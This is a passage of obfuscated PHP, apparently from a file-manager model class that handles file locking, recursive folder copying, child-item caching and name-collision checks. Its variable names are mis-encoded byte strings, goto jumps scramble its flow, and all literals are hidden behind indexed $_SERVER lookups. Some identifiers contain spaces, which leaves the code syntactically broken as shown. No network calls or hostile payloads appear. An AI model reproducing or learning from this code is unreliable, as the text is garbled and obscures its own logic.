$D•–ÊŒ˜‘²); goto C®Ïèƒ¿•; d˜ÓîÔŠœ‹: } public function lockWriteEnd($Bª‘Ñáã²¨, $Fã§’çĞÊˆ = '') { $bºĞÓš˜î„ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->allowLock()) { return; } $E–†Œ®ã¬– = 0; $this->_lockKey($bºĞÓš˜î„[512] . $Bª‘Ñáã²¨ . $bºĞÓš˜î„[94] . $Fã§’çĞÊˆ, $E–†Œ®ã¬–); $this->_lockEvent($Bª‘Ñáã²¨, array($bºĞÓš˜î„[507], $bºĞÓš˜î„[509]), $E–†Œ®ã¬–); $this->_lockParent($Bª‘Ñáã²¨, array($bºĞÓš˜î„[507], $bºĞÓš˜î„[509]), $E–†Œ®ã¬–); } public function lockMoveStart($C­ä…ê¹øÛ) { goto BÜÉº¾Àø; a‡©§‘§â°: $this->_lockParent($C­ä…ê¹øÛ, array($AÈëàÃ®‚[507], $AÈëàÃ®‚[509]), $C¹ùÉ£³‰¿); $this->_lockEvent($C­ä…ê¹øÛ, array($AÈëàÃ®‚[514], $AÈëàÃ®‚[510], $AÈëàÃ®‚[511]), $C¹ùÉ£³‰¿); $this->_lockCheckEnd($AÈëàÃ®‚[509], $C­ä…ê¹øÛ); goto Eˆ™™¾±Äİ; BÜÉº¾Àø: $AÈëàÃ®‚ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->allowLock()) { return; } $this->_lockCheck($AÈëàÃ®‚[509], $C­ä…ê¹øÛ); goto AÜƒíÖ°Ç; AÜƒíÖ°Ç: $C¹ùÉ£³‰¿ = 1; $this->_lockKey($AÈëàÃ®‚[513] . $C­ä…ê¹øÛ, $C¹ùÉ£³‰¿); $this->_lockEvent($C­ä…ê¹øÛ, array($AÈëàÃ®‚[507], $AÈëàÃ®‚[508]), $C¹ùÉ£³‰¿); goto a‡©§‘§â°; Eˆ™™¾±Äİ: } public function lockMoveEnd($dæïèÇÂ¨£) { goto cå¸Ë×‚¬‰; Có“°ø¼òª: $this->_lockKey($A¯ğé»‚÷‰[513] . $dæïèÇÂ¨£, $EßùÅæÁÄŠ); $this->_lockEvent($dæïèÇÂ¨£, array($A¯ğé»‚÷‰[507], $A¯ğé»‚÷‰[508]), $EßùÅæÁÄŠ); $this->_lockParent($dæïèÇÂ¨£, array($A¯ğé»‚÷‰[507], $A¯ğé»‚÷‰[509]), $EßùÅæÁÄŠ); goto eß˜¨áƒğÀ; eß˜¨áƒğÀ: $this->_lockEvent($dæïèÇÂ¨£, array($A¯ğé»‚÷‰[514], $A¯ğé»‚÷‰[510], $A¯ğé»‚÷‰[511]), $EßùÅæÁÄŠ); goto E÷Œ§ß¥˜Ş; cå¸Ë×‚¬‰: $A¯ğé»‚÷‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->allowLock()) { return; } $EßùÅæÁÄŠ = 0; goto Có“°ø¼òª; E÷Œ§ß¥˜Ş: } private function _lockCheck($Cõµ¦…´ÅÅ, $f¹Ãøæßƒ•) { goto E¢Ö‘Çø; E¢Ö‘Çø: $cŸÊî·Œ»­ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Dê¿•ºåç = $this->sourceInfo($f¹Ãøæßƒ•); $dšĞ˜È…—â = $Cõµ¦…´ÅÅ . $cŸÊî·Œ»­[94] . $f¹Ãøæßƒ•; goto f¡¸ôîÎİø; eáâ—Ò…˜Ú: $DØŠÒ®Øé“ = array_reverse($this->parentLevelArray($Dê¿•ºåç[$cŸÊî·Œ»­[477]])); foreach ($DØŠÒ®Øé“ as $AÆ™¤†¯œš) { $dšĞ˜È…—â = $Cõµ¦…´ÅÅ . $cŸÊî·Œ»­[516] . $AÆ™¤†¯œš; if (CacheLock::lockGet($cŸÊî·Œ»­[517] . $dšĞ˜È…—â)) { $Dê¿•ºåç = $this->sourceInfo($AÆ™¤†¯œš); CacheLock::setErrorMsg($cŸÊî·Œ»­[159] . htmlspecialchars($Dê¿•ºåç[$cŸÊî·Œ»­[28]]) . $cŸÊî·Œ»­[494] . $bÔÄ‹õ™˜); $this->_lockKey($dšĞ˜È…—â, 1); $this->_lockKey($dšĞ˜È…—â, 0); } } goto cÊ‡»¦„·; f¡¸ôîÎİø: $this->_lockTimeStart[$dšĞ˜È…—â] = timeFloat(); if (!is_array($Dê¿•ºåç)) { return; } $bÔÄ‹õ™˜ = LNG($cŸÊî·Œ»­[515]); goto e°Ñ¯¾øÓù; e°Ñ¯¾øÓù: CacheLock::setErrorMsg($cŸÊî·Œ»­[159] . htmlspecialchars($Dê¿•ºåç[$cŸÊî·Œ»­[28]]) . $cŸÊî·Œ»­[494] . $bÔÄ‹õ™˜); $this->_lockKey($dšĞ˜È…—â, 1); $this->_lockKey($dšĞ˜È…—â, 0); goto eáâ—Ò…˜Ú; cÊ‡»¦„·: } private function _lockCheckEnd($bÚóí™¶«©, $cåÒÇÚçİß) { goto fÈ˜‹¹Š; AØØ³¬áçˆ: if (!isset($this->_lockTimeStart[$bîã¿”šõ])) { return; } $bÍ±¯Ğ¬Ä¼ = timeFloat() - $this->_lockTimeStart[$bîã¿”šõ]; unset($this->_lockTimeStart[$bîã¿”šõ]); goto dÀèĞ…äÈ; fÈ˜‹¹Š: $Bñ×ÁåŞâ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bîã¿”šõ = $bÚóí™¶«© . $Bñ×ÁåŞâ[94] . $cåÒÇÚçİß; CacheLock::setErrorMsg($Bñ×ÁåŞâ[370]); goto AØØ³¬áçˆ; dÀèĞ…äÈ: if ($bÍ±¯Ğ¬Ä¼ > 0.5) { unset(self::$cacheSourceInfo[$Bñ×ÁåŞâ[427] . $cåÒÇÚçİß]); } $eàì‘å¸á = $this->sourceInfo($cåÒÇÚçİß); if (!$eàì‘å¸á) { show_json(LNG($Bñ×ÁåŞâ[104]), !1); } goto c¿š„ôš³¯; c¿š„ôš³¯: } private function _lockParent($BôéÍÚÏ¶ï, $BŸ¶½í„ï, $D—êÖ™¯ ğ) { if (!$this->autoLockSet) { return; } $f²ñÉÛò„‹ = $this->sourceInfo($BôéÍÚÏ¶ï); if (!is_array($f²ñÉÛò„‹)) { return; } $bÛ®…å˜§» = array_reverse($this->parentLevelArray($f²ñÉÛò„‹[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][477]])); foreach ($bÛ®…å˜§» as $dÔÅ®º§»é) { $this->_lockEvent($dÔÅ®º§»é, $BŸ¶½í„ï, $D—êÖ™¯ ğ); } } private function _lockEvent($C„Şá¸â‚Õ, $Cí´¼¿º±ø, $fë„êÛ»—) { $f¤õ¡¦•¢ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->autoLockSet) { return; } foreach ($Cí´¼¿º±ø as $e‡˜ø±ÔÎ±) { $Få³µÔ×Âİ = $e‡˜ø±ÔÎ± . $f¤õ¡¦•¢[94] . $C„Şá¸â‚Õ; if ($fë„êÛ»— && CacheLock::lockGet($f¤õ¡¦•¢[517] . $Få³µÔ×Âİ)) { continue; } $this->_lockKey($Få³µÔ×Âİ, $fë„êÛ»—); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($eª“ÔöÙé¢, $bì¦âï”¦Î = 1) { $aë‰íÙªË = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][517] . md5($eª“ÔöÙé¢); if ($bì¦âï”¦Î) { if (isset(self::$_lockItemArr[$aë‰íÙªË])) { return; } self::$_lockItemArr[$aë‰íÙªË] = 1; CacheLock::lock($aë‰íÙªË, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$aë‰íÙªË])) { return; } unset(self::$_lockItemArr[$aë‰íÙªË]); CacheLock::unlock($aë‰íÙªË); } } public function isParentOf($a¸÷¦Ş¯‹æ, $b”õØÀêÂâ) { goto BÍî˜’ƒƒØ; Aäé¤¯ßêÆ: return $D§°ÏÛî˜®; goto D¸Æ‹Ëƒ‹æ; DÂÙ³ö×Â™: $d…®ê‰Ï– = $e®¡íĞ†ÖÎ[$C°ÆîÜ‚¥‹[477]] . $e®¡íĞ†ÖÎ[$C°ÆîÜ‚¥‹[387]] . $C°ÆîÜ‚¥‹[47]; $bÈƒãíáÒÌ = $D‡¼Ø¤ÂÁë[$C°ÆîÜ‚¥‹[477]] . $D‡¼Ø¤ÂÁë[$C°ÆîÜ‚¥‹[387]] . $C°ÆîÜ‚¥‹[47]; $D§°ÏÛî˜® = strpos($bÈƒãíáÒÌ, $d…®ê‰Ï–) === 0; goto Aäé¤¯ßêÆ; BÍî˜’ƒƒØ: $C°ÆîÜ‚¥‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e®¡íĞ†ÖÎ = $this->sourceInfo($a¸÷¦Ş¯‹æ); $D‡¼Ø¤ÂÁë = $this->sourceInfo($b”õØÀêÂâ); goto DÂÙ³ö×Â™; D¸Æ‹Ëƒ‹æ: } private $targetIsDelete = 0; public function copy($FÚâ”›‘ÜÂ, $D‡•ªÂ“‚·, $eÓÁ‹ç„„ = REPEAT_REPLACE, $E·­Õ„¹Ûá = '') { goto aœ‡ƒÖ­‚; aœ‡ƒÖ­‚: $D“ÏšŸæ´ó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fŠ°ˆµÁ = $this->sourceInfo($FÚâ”›‘ÜÂ); $F£éª˜¦ğ± = $this->sourceInfo($D‡•ªÂ“‚·); goto e–ÊŒ·çôÄ; e–ÊŒ·çôÄ: if (!$fŠ°ˆµÁ || !$F£éª˜¦ğ± || $F£éª˜¦ğ±[$D“ÏšŸæ´ó[388]] != $D“ÏšŸæ´ó[86]) { return !1; } if ($this->isParentOf($FÚâ”›‘ÜÂ, $D‡•ªÂ“‚·)) { return !1; } $FàÜà½Ö = $E·­Õ„¹Ûá ? $E·­Õ„¹Ûá : $fŠ°ˆµÁ[$D“ÏšŸæ´ó[28]]; goto Bô‚çÚÖÂ; c’®é…Ì™“: $this->targetIsDelete = intval($fŠ°ˆµÁ[$D“ÏšŸæ´ó[414]]); $CÈ©Äˆƒ…¼ = $this->fileNameExistCache($D‡•ªÂ“‚·, $fŠ°ˆµÁ[$D“ÏšŸæ´ó[28]]); $d‡ê±’ç = $this->_copy($FÚâ”›‘ÜÂ, $D‡•ªÂ“‚·, $eÓÁ‹ç„„, $eê¦ˆÌÀ‡, !0, $E·­Õ„¹Ûá); goto BğáÌ³·Í; Bô‚çÚÖÂ: $this->lockCopyStart($FÚâ”›‘ÜÂ); $this->lockWriteStart($D‡•ªÂ“‚·, $FàÜà½Ö); $eê¦ˆÌÀ‡ = array($D“ÏšŸæ´ó[518] => array(), $D“ÏšŸæ´ó[519] => array(), $D“ÏšŸæ´ó[520] => array()); goto c’®é…Ì™“; cåõĞğè²: $this->saveAll($eê¦ˆÌÀ‡[$D“ÏšŸæ´ó[520]]); Model($D“ÏšŸæ´ó[173])->linkAdd($eê¦ˆÌÀ‡[$D“ÏšŸæ´ó[518]]); $this->folderSizeReset($D‡•ªÂ“‚·); goto AâÓŒ’¦; f“äÛ‚äÖ: if ($fŠ°ˆµÁ[$D“ÏšŸæ´ó[388]] == $D“ÏšŸæ´ó[86] && $CÈ©Äˆƒ…¼ == $d‡ê±’ç) { $this->folderSizeResetChildren($CÈ©Äˆƒ…¼); } Model($D“ÏšŸæ´ó[521])->addAll($eê¦ˆÌÀ‡[$D“ÏšŸæ´ó[519]], array(), !0); if ($CÈ©Äˆƒ…¼ != $d‡ê±’ç || $fŠ°ˆµÁ[$D“ÏšŸæ´ó[388]] == $D“ÏšŸæ´ó[86]) { Model($D“ÏšŸæ´ó[522])->eventCopy($d‡ê±’ç); } goto cåõĞğè²; AâÓŒ’¦: $this->updateModifyTime($D‡•ªÂ“‚·); return $d‡ê±’ç; goto A²ç§ù®óé; BğáÌ³·Í: $this->_childrenListClear(); $this->lockCopyEnd($FÚâ”›‘ÜÂ); $this->lockWriteEnd($D‡•ªÂ“‚·, $FàÜà½Ö); goto f“äÛ‚äÖ; A²ç§ù®óé: } private function _copy($d‰Áï»÷, $C½ã´òñ, $dÊŸÏñ¬§ƒ, &$c²¥ÀË„¤Å, $e±‚ÌÕËõ, $cµĞ»äƒÇ¡ = '') { goto DŠ¨Â×œÃÕ; e¡‡ áˆæ”: if (!$câ÷‡¾é‰) { return $this->_copyCreate($d‰Áï»÷, $C½ã´òñ, $FÚšÌ“ñ¥”, $c²¥ÀË„¤Å); } $D‹«…Ä¶ˆ® = $câ÷‡¾é‰; if ($A—¨ÍóïÔ) { if ($dÊŸÏñ¬§ƒ == REPEAT_RENAME_FOLDER) { $FÚšÌ“ñ¥” = $this->fileNameAutoCache($C½ã´òñ, $FÚšÌ“ñ¥”, $dÊŸÏñ¬§ƒ, $A—¨ÍóïÔ); $D‹«…Ä¶ˆ® = $this->_copyCreate($d‰Áï»÷, $C½ã´òñ, $FÚšÌ“ñ¥”, $c²¥ÀË„¤Å); } else { $b–ÖåŸ…õŒ = $this->_childrenList($d‰Áï»÷); foreach ($b–ÖåŸ…õŒ as $c…†¸Á”š) { $this->_copy($c…†¸Á”š[$dÅ­²Ëì”Ú[387]], $câ÷‡¾é‰, $dÊŸÏñ¬§ƒ, $c²¥ÀË„¤Å, !1); } } } else { if ($dÊŸÏñ¬§ƒ == REPEAT_RENAME || $dÊŸÏñ¬§ƒ == REPEAT_RENAME_FOLDER) { $FÚšÌ“ñ¥” = $this->fileNameAutoCache($C½ã´òñ, $FÚšÌ“ñ¥”, $dÊŸÏñ¬§ƒ, $A—¨ÍóïÔ); $D‹«…Ä¶ˆ® = $this->_copyCreate($d‰Áï»÷, $C½ã´òñ, $FÚšÌ“ñ¥”, $c²¥ÀË„¤Å); } else { if ($dÊŸÏñ¬§ƒ == REPEAT_REPLACE) { $e–Ÿ‚”›ñ¦ = $this->sourceInfoCache($câ÷‡¾é‰); $a‰Ö‚’­‘ = $this->fileHistory($e–Ÿ‚”›ñ¦, $aôÕæ³ëæ¥[$dÅ­²Ëì”Ú[436]], $aôÕæ³ëæ¥[$dÅ­²Ëì”Ú[77]]); if ($a‰Ö‚’­‘) { $c²¥ÀË„¤Å[$dÅ­²Ëì”Ú[518]][] = $aôÕæ³ëæ¥[$dÅ­²Ëì”Ú[436]]; } } else { if ($dÊŸÏñ¬§ƒ == REPEAT_SKIP) { } } } Hook::trigger($dÅ­²Ëì”Ú[523], array($dÅ­²Ëì”Ú[524], $aôÕæ³ëæ¥, 0)); } goto d«ˆÃÈ¥ğğ; d­¬•öƒ: $FÚšÌ“ñ¥” = $cµĞ»äƒÇ¡ ? $cµĞ»äƒÇ¡ : $aôÕæ³ëæ¥[$dÅ­²Ëì”Ú[28]]; $câ÷‡¾é‰ = $this->fileNameExistCache($C½ã´òñ, $FÚšÌ“ñ¥”); if ($e±‚ÌÕËõ) { $this->_childrenAllMake($d‰Áï»÷); if ($A—¨ÍóïÔ && $câ÷‡¾é‰) { $this->_childrenAllMake($câ÷‡¾é‰); } } goto e¡‡ áˆæ”; DŠ¨Â×œÃÕ: $dÅ­²Ëì”Ú =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aôÕæ³ëæ¥ = $this->sourceInfoCache($d‰Áï»÷); $A—¨ÍóïÔ = $aôÕæ³ëæ¥[$dÅ­²Ëì”Ú[388]] == $dÅ­²Ëì”Ú[86]; goto d­¬•öƒ; d«ˆÃÈ¥ğğ: return $D‹«…Ä¶ˆ®; goto aî‡Áå†Ù; aî‡Áå†Ù: } private function _copyCreate($bì»â³èí®, $CñİéôƒĞë, $eÕ²ÅÍ‹Äô, &$ašèÆçâÍ) { goto eçÒôßˆ‘´; eçÒôßˆ‘´: $f«…•œªğœ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C¬Û–Œ–Ä = $this->sourceInfoCache($bì»â³èí®); $DºŸŠ‹Î›ø = $this->sourceInfoCache($CñİéôƒĞë); goto BšÔƒ¯ĞÈ§; døŒáÕùË¼: foreach ($B‚ ÉÔš…˜ as $eğäššš™Á) { $Eà¨ŠŞî®¾ = $eğäššš™Á[$f«…•œªğœ[387]]; $E«§È˜½ê = $this->_childrenMatch($a…£×Èã…, $eğäššš™Á, $A¸Åòš˜Ñê); $cì†¼ššÃÑ[] = array($f«…•œªğœ[387], $Eà¨ŠŞî®¾, $f«…•œªğœ[479], $E«§È˜½ê[$f«…•œªğœ[479]]); $F…¦³­›‡Ó[] = array($f«…•œªğœ[387], $Eà¨ŠŞî®¾, $f«…•œªğœ[477], $E«§È˜½ê[$f«…•œªğœ[477]]); $this->_copyApplyMeta($eğäššš™Á, $ašèÆçâÍ); if ($eğäššš™Á[$f«…•œªğœ[388]] != $f«…•œªğœ[86]) { $ašèÆçâÍ[$f«…•œªğœ[518]][] = $eğäššš™Á[$f«…•œªğœ[436]]; } } $this->chunkEventSet($f«…•œªğœ[530], array($f«…•œªğœ[531], $dŒñôŞ¦´, $d­ù×õŞñŠ)); $this->saveAll($cì†¼ššÃÑ); goto b¼’¨ÑÙ; cªã§ÕÑŠ’: $this->addAll($CíëŒ„¨ä, array(), !1); $B‚ ÉÔš…˜ = $this->where(array($f«…•œªğœ[479] => $cõçº”™‹¯))->select(); $a…£×Èã… = $this->_childrenMakeRelation($fé¢·¬†é, $B‚ ÉÔš…˜); goto dÃöˆËÕ›¶; dÃöˆËÕ›¶: $a…£×Èã…[$bì»â³èí®] = $cõçº”™‹¯; $cì†¼ššÃÑ = array(); $F…¦³­›‡Ó = array(); goto døŒáÕùË¼; FÁÔ´‰Ä—ê: $cõçº”™‹¯ = $this->add($dŒñôŞ¦´); $E˜³èÀÎÎ” = array($f«…•œªğœ[387] => $cõçº”™‹¯, $f«…•œªğœ[28] => $eÕ²ÅÍ‹Äô); $this->_copyApplyMeta($E˜³èÀÎÎ”, $ašèÆçâÍ); goto A¢­À‚Ë‹Ë; b¼’¨ÑÙ: $this->chunkEventSet($f«…•œªğœ[532], array($f«…•œªğœ[533], $dŒñôŞ¦´, $d­ù×õŞñŠ)); $this->saveAll($F…¦³­›‡Ó); return $cõçº”™‹¯; goto f”è°ó“„ã; A¢­À‚Ë‹Ë: if ($C¬Û–Œ–Ä[$f«…•œªğœ[388]] != $f«…•œªğœ[86]) { $ašèÆçâÍ[$f«…•œªğœ[518]][] = $C¬Û–Œ–Ä[$f«…•œªğœ[436]]; return $cõçº”™‹¯; } $fé¢·¬†é = array(); $CíëŒ„¨ä = array(); goto E”Îç¿ĞßĞ; F‹©²‡®¤Ö: $A¸Åòš˜Ñê = $this->sourceInfo($cõçº”™‹¯); foreach ($fé¢·¬†é as $eğäššš™Á) { $bÙö¨«ÎøŠ = $this->_makeItemData($eğäššš™Á, $A¸Åòš˜Ñê, $eğäššš™Á[$f«…•œªğœ[28]]); $bÙö¨«ÎøŠ[$f«…•œªğœ[477]] = $eğäššš™Á[$f«…•œªğœ[477]]; $CíëŒ„¨ä[] = $bÙö¨«ÎøŠ; } $this->chunkEventSet($f«…•œªğœ[528], array($f«…•œªğœ[529], $dŒñôŞ¦´, $d­ù×õŞñŠ)); goto cªã§ÕÑŠ’; E”Îç¿ĞßĞ: $this->_childrenListAll($bì»â³èí®, $fé¢·¬†é); $d­ù×õŞñŠ = count($fé¢·¬†é); if ($d­ù×õŞñŠ == 0) { return $cõçº”™‹¯; } goto F‹©²‡®¤Ö; BšÔƒ¯ĞÈ§: $dŒñôŞ¦´ = $this->_makeItemData($C¬Û–Œ–Ä, $DºŸŠ‹Î›ø, $eÕ²ÅÍ‹Äô); Hook::trigger($f«…•œªğœ[525], $dŒñôŞ¦´); Hook::trigger($f«…•œªğœ[526], array($f«…•œªğœ[527], $dŒñôŞ¦´, 0)); goto FÁÔ´‰Ä—ê; f”è°ó“„ã: } private function _childrenMakeRelation($f–é›Çò¬«, $EÊÊŞ»ê°Í) { $e¡ÆÛÙá¦ß =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CÓ…à¬¿„ = array(); $F¬òâİ¯… = array(); foreach ($f–é›Çò¬« as $E‹Ïàøâª ) { $d“ùíŠ‡ÎŠ = $E‹Ïàøâª [$e¡ÆÛÙá¦ß[28]] . $e¡ÆÛÙá¦ß[8] . $E‹Ïàøâª [$e¡ÆÛÙá¦ß[477]]; $CÓ…à¬¿„[$d“ùíŠ‡ÎŠ] = $E‹Ïàøâª [$e¡ÆÛÙá¦ß[387]]; } foreach ($EÊÊŞ»ê°Í as $E‹Ïàøâª ) { $d“ùíŠ‡ÎŠ = $E‹Ïàøâª [$e¡ÆÛÙá¦ß[28]] . $e¡ÆÛÙá¦ß[8] . $E‹Ïàøâª [$e¡ÆÛÙá¦ß[477]]; $dÏÀ÷˜ÉÌ‚ = $CÓ…à¬¿„[$d“ùíŠ‡ÎŠ]; $F¬òâİ¯…[$dÏÀ÷˜ÉÌ‚] = $E‹Ïàøâª [$e¡ÆÛÙá¦ß[387]]; } return $F¬òâİ¯…; } private function _childrenMatch($F¯½ÂâÚ’Ğ, $dˆÇâÜÀ, $bÔİ·‘İÊ¾) { goto Cäˆ†±Œ•«; Cäˆ†±Œ•«: $B³Ñ”©† =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Bì‰‘Öà = $bÔİ·‘İÊ¾[$B³Ñ”©†[477]]; $cÛŠ«™œ¹ = $this->parentLevelArray($dˆÇâÜÀ[$B³Ñ”©†[477]]); goto CÂÖ¼´åîé; e¬¸–èÂ: $cöÆ¦ƒ‹åÃ = $d…Ã¿¼ˆê[count($d…Ã¿¼ˆê) - 1]; return array($B³Ñ”©†[479] => $cöÆ¦ƒ‹åÃ, $B³Ñ”©†[477] => $Bì‰‘Öà); goto Có­òÒ²ÄÛ; CÂÖ¼´åîé: foreach ($cÛŠ«™œ¹ as $EŠœ÷¤ÏÈ¬) { if (isset($F¯½ÂâÚ’Ğ[$EŠœ÷¤ÏÈ¬])) { $Bì‰‘Öà .= $F¯½ÂâÚ’Ğ[$EŠœ÷¤ÏÈ¬] . $B³Ñ”©†[534]; } } $Bì‰‘Öà = rtrim($Bì‰‘Öà, $B³Ñ”©†[47]) . $B³Ñ”©†[47]; $d…Ã¿¼ˆê = $this->parentLevelArray($Bì‰‘Öà); goto e¬¸–èÂ; Có­òÒ²ÄÛ: } private function _makeItemData($eÓˆ¥‹£²Í, $fñòìî©ç, $B®–ÚïğöŒ) { $Eê†“¤¬¿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fÀ³‚‹ìé² = array($Eê†“¤¬¿[535] => $eÓˆ¥‹£²Í[$Eê†“¤¬¿[388]], $Eê†“¤¬¿[404] => $B®–ÚïğöŒ, $Eê†“¤¬¿[536] => $eÓˆ¥‹£²Í[$Eê†“¤¬¿[390]], $Eê†“¤¬¿[437] => $eÓˆ¥‹£²Í[$Eê†“¤¬¿[436]], $Eê†“¤¬¿[537] => $eÓˆ¥‹£²Í[$Eê†“¤¬¿[77]], $Eê†“¤¬¿[538] => $fñòìî©ç[$Eê†“¤¬¿[389]], $Eê†“¤¬¿[539] => $fñòìî©ç[$Eê†“¤¬¿[474]], $Eê†“¤¬¿[540] => USER_ID, $Eê†“¤¬¿[541] => USER_ID, $Eê†“¤¬¿[386] => $fñòìî©ç[$Eê†“¤¬¿[387]], $Eê†“¤¬¿[542] => $fñòìî©ç[$Eê†“¤¬¿[477]] . $fñòìî©ç[$Eê†“¤¬¿[387]] . $Eê†“¤¬¿[47], $Eê†“¤¬¿[413] => 0, $Eê†“¤¬¿[543] => $Eê†“¤¬¿[33]); return $fÀ³‚‹ìé²; } private function _copyApplyMeta($c•ÄßİŞ, &$aÂ©çˆŞ¿¨) { $aŠõ®êÏø =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $açé–Ó‘ÕÒ = $c•ÄßİŞ[$aŠõ®êÏø[387]]; $b†·Ğ®ÚĞ› = $c•ÄßİŞ[$aŠõ®êÏø[28]]; if (!isset($c•ÄßİŞ[$aŠõ®êÏø[544]]) || !$c•ÄßİŞ[$aŠõ®êÏø[544]] || $c•ÄßİŞ[$aŠõ®êÏø[544]] == $aŠõ®êÏø[486]) { $aÂ©çˆŞ¿¨[$aŠõ®êÏø[520]][] = array($aŠõ®êÏø[387], $açé–Ó‘ÕÒ, $aŠõ®êÏø[544], short_id($açé–Ó‘ÕÒ)); } if (Input::check($b†·Ğ®ÚĞ›, $aŠõ®êÏø[545])) { $aÂ©çˆŞ¿¨[$aŠõ®êÏø[519]][] = array($aŠõ®êÏø[387] => $açé–Ó‘ÕÒ, $aŠõ®êÏø[92] => $aŠõ®êÏø[433], $aŠõ®êÏø[368] => str_replace($aŠõ®êÏø[50], $aŠõ®êÏø[33], Pinyin::encode($b†·Ğ®ÚĞ›))); $aÂ©çˆŞ¿¨[$aŠõ®êÏø[519]][] = array($aŠõ®êÏø[387] => $açé–Ó‘ÕÒ, $aŠõ®êÏø[92] => $aŠõ®êÏø[432], $aŠõ®êÏø[368] => Pinyin::encode($b†·Ğ®ÚĞ›, $aŠõ®êÏø[546])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($bà­š°¢‰) { goto DáÔò·ç‹˜; e½àÎšôàˆ: $aòªœ¼™¤Ã = array_to_keyvalue($aòªœ¼™¤Ã, $f¿İºØ…[387]); foreach ($aòªœ¼™¤Ã as $AóÅ¡‚ê†À) { $CÓÑ«Û· = $AóÅ¡‚ê†À[$f¿İºØ…[479]]; $bà­š°¢‰ = $AóÅ¡‚ê†À[$f¿İºØ…[387]]; if (!isset($this->_childrenListCache[$bà­š°¢‰]) && $AóÅ¡‚ê†À[$f¿İºØ…[388]] == $f¿İºØ…[86]) { $this->_childrenListCache[$bà­š°¢‰] = array(); } if (!isset($this->_childrenListCache[$CÓÑ«Û·])) { $this->_childrenListCache[$CÓÑ«Û·] = array(); } $this->_childrenListCache[$CÓÑ«Û·][$bà­š°¢‰] = $AóÅ¡‚ê†À; $this->_childrenItemCache[$bà­š°¢‰] = $AóÅ¡‚ê†À; } goto a ÔĞ£Å; aÑƒÅğ‚”…: $b‹¤öÇÍì± = array($f¿İºØ…[477] => array($f¿İºØ…[501], $A‚­¸ÂôÒƒ[$f¿İºØ…[477]] . $bà­š°¢‰ . $f¿İºØ…[502]), $f¿İºØ…[414] => $this->targetIsDelete); $aòªœ¼™¤Ã = $this->field($c‰ïã‰½¯Ö)->where($b‹¤öÇÍì±)->select(); if (!$aòªœ¼™¤Ã) { return; } goto e½àÎšôàˆ; DáÔò·ç‹˜: $f¿İºØ… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A‚­¸ÂôÒƒ = $this->sourceInfo($bà­š°¢‰); $c‰ïã‰½¯Ö = $f¿İºØ…[415]; goto aÑƒÅğ‚”…; a ÔĞ£Å: } private function _childrenListAll($E±¶“Ø¡, &$DÙ“´†Ş‚) { $f§õ ñï =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!isset($this->_childrenListCache[$E±¶“Ø¡])) { return; } $cÊ½ŠøÅ¶è = $this->_childrenListCache[$E±¶“Ø¡]; foreach ($cÊ½ŠøÅ¶è as $E¼ö¬¼¦õ => $EÏËùÌêùÈ) { $DÙ“´†Ş‚[$E¼ö¬¼¦õ] = $EÏËùÌêùÈ; if ($EÏËùÌêùÈ[$f§õ ñï[388]] == $f§õ ñï[86]) { $this->_childrenListAll($E¼ö¬¼¦õ, $DÙ“´†Ş‚); } } } private function sourceInfoCache($A÷õáîÆµì) { if (isset($this->_childrenItemCache[$A÷õáîÆµì])) { return $this->_childrenItemCache[$A÷õáîÆµì]; } return $this->sourceInfo($A÷õáîÆµì); } private function _childrenList($dÛ‚ƒ…‹çÏ) { if (isset($this->_childrenListCache[$dÛ‚ƒ…‹çÏ])) { return $this->_childrenListCache[$dÛ‚ƒ…‹çÏ]; } return $this->_childrenListSelect($dÛ‚ƒ…‹çÏ); } private function _childrenListSelect($dë¯œÙ´ïÓ) { goto FÚªÅ§„‰ù; eĞòÍ…‰è: $d„™“ö§÷† = $d„™“ö§÷† ? $d„™“ö§÷† : array(); $dìÈä„‹Éñ = array_to_keyvalue($d„™“ö§÷†, $d”ç½¸Ü¶[387]); $this->_childrenListCache[$dë¯œÙ´ïÓ] = $dìÈä„‹Éñ; goto A¯ĞŠÁ¹; A¯ĞŠÁ¹: foreach ($dìÈä„‹Éñ as $dë¯œÙ´ïÓ => $cÑ÷±à‰Ğ³) { $this->_childrenItemCache[$dë¯œÙ´ïÓ] = $cÑ÷±à‰Ğ³; } return $dìÈä„‹Éñ; goto eÑ¾Œßº; FÚªÅ§„‰ù: $d”ç½¸Ü¶ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $a¾Ã¼×àÑò = array($d”ç½¸Ü¶[479] => $dë¯œÙ´ïÓ, $d”ç½¸Ü¶[414] => $this->targetIsDelete); $d„™“ö§÷† = $this->where($a¾Ã¼×àÑò)->select(); goto eĞòÍ…‰è; eÑ¾Œßº: } private function fileNameExistCache($c‹ÇÕÙğ™¤, $E¾Œ‘¿ÛÅ§) { $f»Ô¦òÊİ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E¾Œ‘¿ÛÅ§ = strtolower($E¾Œ‘¿ÛÅ§); $BÖŒîÂ­³‹ = $this->_childrenList($c‹ÇÕÙğ™¤); foreach ($BÖŒîÂ­³‹ as $D‹÷ë¹—êË) { if ($E¾Œ‘¿ÛÅ§ == strtolower($D‹÷ë¹—êË[$f»Ô¦òÊİ[28]])) { return $D‹÷ë¹—êË[$f»Ô¦òÊİ[387]]; } } return !1; } private function fileNameAutoCache($B¥õ¬Œ“ö, $E†ô‘’•™‚, $eãºÄ«‹ç‚, $cªë›ºĞ) { 